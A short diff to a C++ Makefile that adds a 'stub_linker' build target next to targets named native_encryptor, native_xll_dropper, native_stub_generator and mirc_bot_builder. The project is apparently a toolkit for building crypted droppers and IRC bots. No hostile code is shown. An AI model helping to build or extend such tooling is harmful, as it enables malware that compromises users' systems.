@@ -5,7 +5,7 @@ CXX = g++
 CXXFLAGS = -std=c++17 -O2 -Wall -Wextra -pedantic
 
 # Native targets (zero dependencies)
-NATIVE_TARGETS = native_encryptor native_xll_dropper native_gui native_stub_generator mirc_bot_builder
+NATIVE_TARGETS = native_encryptor native_xll_dropper native_gui native_stub_generator mirc_bot_builder stub_linker
 
 # Default target (builds native implementation)
 all: native
